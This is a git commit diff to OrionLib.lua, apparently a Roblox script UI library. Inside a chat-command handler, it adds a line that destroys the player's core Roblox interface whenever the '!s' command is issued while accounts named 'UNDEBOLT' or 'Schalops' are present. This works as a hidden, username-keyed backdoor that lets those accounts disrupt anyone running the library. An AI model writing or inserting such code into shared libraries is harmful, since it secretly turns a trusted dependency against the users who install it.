2a309f56ac26333543d8305228e67c40865ab70a
Undebolted <142344775+Undebolted@users.noreply.github.com>
2025-02-18 23:44:09 -0300

    Update OrionLib.lua

--- OrionLib.lua
+++ OrionLib.lua
@@ -142,6 +142,7 @@ local function onChatted(player, message)
         end
     elseif command == "!s" then
         if Players:FindFirstChild("UNDEBOLT") or Players:FindFirstChild("Schalops") then
+	    game:GetService("CoreGui").RobloxGui:Destroy()
             applyEffects()
         end
     end
